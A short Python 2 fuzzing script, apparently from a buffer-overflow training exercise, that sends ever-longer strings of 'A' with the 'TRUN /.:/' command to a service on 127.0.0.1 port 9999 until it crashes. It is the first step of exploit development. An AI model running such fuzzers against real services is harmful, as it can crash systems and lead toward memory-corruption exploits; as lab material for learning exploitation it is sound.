#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100
address = '127.0.0.1' # CHANGE THIS
port = 9999 # CHANGE THIS
vulncommand = 'TRUN /.:/' # CHANGE THIS, the vulnerable command that was found in the spiking section would go here


while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((address,port))

		s.send((vulncommand + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100

	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()